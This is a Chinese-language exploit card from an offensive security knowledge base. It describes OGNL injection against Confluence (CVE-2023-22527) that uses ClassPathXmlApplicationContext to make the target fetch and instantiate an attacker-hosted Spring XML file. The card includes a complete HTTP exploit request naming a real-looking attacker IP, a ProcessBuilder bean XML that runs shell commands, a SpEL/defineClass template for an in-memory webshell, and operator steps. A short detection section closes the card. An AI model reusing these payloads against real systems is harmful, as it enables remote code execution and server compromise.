---
id: web-java-expression-ognl-classpathxmlapplicationcontext-remote-xml-rce
title: OGNL 出网加载远程 Spring XML：new ClassPathXmlApplicationContext 使目标拉取攻击者 XML 并实例化 bean
type: scenario
domain: web
path: web/java/expression/ognl
technique: ognl-classpathxmlapplicationcontext-remote-spring-xml
aliases:
- ClassPathXmlApplicationContext OGNL
- OGNL 出网
- Spring XML 出网 RCE
- new ClassPathXmlApplicationContext
- OGNL 远程加载配置
- SelectResult 出网替代
tags:
- java
- ognl
- spring
- xml
- rce
- outbound
- expression-injection
- confluence
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:13:39+08:00'
  notes: 已对照原文及截图02核对：poc=#a=new org.springframework.context.support.ClassPathXmlApplicationContext('http://8.130.24.188:8888/1.xml') 与原文逐字一致，截图确认目标 111.78.227.237 向攻击者 http.server 发起 GET /1.xml(404)，出网拉取原语成立。卡片如实标注 confidence medium 且注明 SpEL/defineClass XML 模板未经原文验证、ProcessBuilder bean 为可靠变体，与原文一致。同 sink 的 pgjdbc/Fastjson/ActiveMQ 卡入口不同，按触发向量独立成卡符合库内惯例。原文未写受影响版本，不设。未验证点：原文未完成 XML 托管后的 bean 实例化/RCE 复现，最终危害依赖 Spring 通用机制与库内已证先例。
---

## 一句话结论

OGNL 注入点若允许 `new` 与静态调用，可用 `#a=new org.springframework.context.support.ClassPathXmlApplicationContext('http://attacker/1.xml')` 让目标进程主动出网拉取并解析攻击者托管的 Spring XML；XML 中的 bean 定义会在目标内实例化，配合 `ProcessBuilder` bean 的 `init-method="start"`（或原文给出的 SpEL/`ReflectUtils.defineClass` 模板）即可执行任意代码或注入内存马，适合命令回显受限、不便反弹 shell 的场景。

## 原理

- **资源加载**：`ClassPathXmlApplicationContext(String)` 构造函数把参数当作资源位置，支持 `http://`、`file://`、`classpath:` 等协议；实例化时 `refresh()` 触发 `XmlBeanDefinitionReader` 拉取并解析 XML，再按 bean 定义创建对象。
- **任意 bean 实例化**：远程 XML 一旦被解析，bean 的 class、构造参数、`init-method`、property 全部由攻击者控制。最直接的写法是 `<bean class="java.lang.ProcessBuilder" init-method="start">`，构造参数为 `bash -c <命令>` 列表，Spring 实例化后调用 `start()` 即执行命令。
- **原文的 SpEL/defineClass 模板**：作者给出 `<context:property-placeholder .../>` + `<bean class="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('<classname>',T(org.springframework.util.Base64Utils).decodeFromString(...),new javax.management.loading.MLet(...)).newInstance().test1()}">` 的模板，意图在 XML 解析阶段借 SpEL 求值 `class` 属性完成 defineClass 内存马。注意：原文截图只证明目标向攻击者发起 `GET /1.xml`（服务端 404），未展示该 SpEL 模板真实执行成功；`class` 属性对 SpEL 的求值依赖 Spring 版本与解析路径，使用前应本地验证，或退回 ProcessBuilder bean 的成熟方式。
- **为什么成立**：OGNL 支持 `new` 任意可访问类与静态方法调用（在绕过黑名单后），`ClassPathXmlApplicationContext` 只是把“任意类实例化”延伸为“加载任意外部配置并实例化 bean”。原文在 CVE-2023-22527 的 ognl 执行对象上验证该表达式能让目标发起出网请求。
- **出网的意义**：无需命令回显、无需落地文件，目标主动连接攻击者，可穿透只限制入站的网络策略；XML 内容变化即可切换载荷（命令执行、内存马、后续利用）。

## 触发条件

- 存在可执行任意构造函数/静态方法的 OGNL 注入（如 Confluence CVE-2023-22527、Struts2 系列），且黑名单不拦截 `ClassPathXmlApplicationContext`。
- 目标能出网访问攻击者 HTTP 服务（或能读取内网/本地可写 XML，如 `file:` 指向已知路径）。
- classpath 存在 spring-context（Confluence 及多数 Java 应用自带或传递依赖）。
- 目标 JVM 创建对象无 SecurityManager 拦截。

## 利用步骤

1. 编写 Spring XML（ProcessBuilder bean 执行命令，或 defineClass 内存马模板），放到攻击者 HTTP 服务（原文 `python3 -m http.server 8888`）。
2. 在 OGNL 注入点发送 `poc=#a=new org.springframework.context.support.ClassPathXmlApplicationContext('http://attacker:8888/1.xml')`。
3. 观察攻击者 HTTP 日志确认目标来拉取 XML（原文截图可见目标 IP 请求 `GET /1.xml`）。
4. 通过命令回连、写文件、DNS/HTTP 回调或内存马连接确认执行结果。
5. 内存马变体：XML 中 defineClass 类并在构造/`init-method` 中注册 listener（配合本库内存马卡）。

## PoC

原文在 CVE-2023-22527 注入点上的请求（`label` 为固定转跳串，`poc` 为出网表达式）：

```http
POST /template/aui/text-inline.vm HTTP/1.1
Host: target:8090
Content-Type: application/x-www-form-urlencoded
Connection: close

label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=#a=new org.springframework.context.support.ClassPathXmlApplicationContext('http://8.130.24.188:8888/1.xml')
```

攻击者侧观察（原文截图）：

```text
python3 -m http.server 8888
<target-ip> - - "GET /1.xml HTTP/1.1" 404 -
```

目标请求已发出；该次因 XML 未托管而 404，可据此确认出网原语成立。

可靠 XML 变体（ProcessBuilder 直接执行命令）：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>id > /tmp/pwned</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

原文 SpEL/defineClass 模板（需按 Spring 版本验证）：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
  <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>
  <bean id="ClassBase64Str" class="java.lang.String">
    <constructor-arg value="<base64>"/>
  </bean>
  <bean class="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('<classname>',
        T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.toString()),
        new javax.management.loading.MLet(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader()))
        .newInstance().test1()}"/>
</beans>
```

## 变体与关联

- **同 sink 不同入口**：[[web-java-component-pgjdbc-cve-2022-21724-socketfactory-spring-xml-rce]]（JDBC `socketFactory` 参数实例化 `ClassPathXmlApplicationContext`，XML 用 ProcessBuilder bean），以及 H2/JDBC 系列同类卡；本卡入口是 OGNL 表达式，不依赖数据库驱动。
- **无出网变体**：`FileSystemXmlApplicationContext` + `file:` 指向可写/已知本地 XML；或 `classpath:` 指向已存在的恶意配置（需先有写文件能力）。
- **入口关联**：[[web-java-component-confluence-cve-2023-22527-text-inline-ognl-rce]]、长度限制 [[web-java-expression-ognl-expression-maxlength-apply-bypass]]、内存马 [[web-java-component-confluence-servlet-request-listener-memshell]]。
- **注意**：原文模板中 `class` 属性的 SpEL 是否被求值取决于 Spring 版本与解析路径，未在原文中验证成功；置信度按 medium 标注，实战先用 ProcessBuilder bean 验证出网链路。

## 检测与防御

- **WAF/表达式检测**：拦截 OGNL 中的 `ClassPathXmlApplicationContext`、`FileSystemXmlApplicationContext`、`ApplicationContext` 等类名与 `new` 构造调用。
- **网络侧**：监控应用服务器出站 HTTP/HTTPS，尤其对陌生 IP 拉取 `.xml` 的行为；限制应用进程访问外网（最小出网策略）。
- **修复**：修复上游 OGNL 注入点（升级 Confluence/Struts2）；用 `MemberAccess` 白名单禁止 `new` 任意类与静态方法调用。
- **运行时**：RASP 监控 `ClassPathXmlApplicationContext` 实例化与远程资源加载；记录 Spring `refresh()` 拉取的外部 XML 来源。
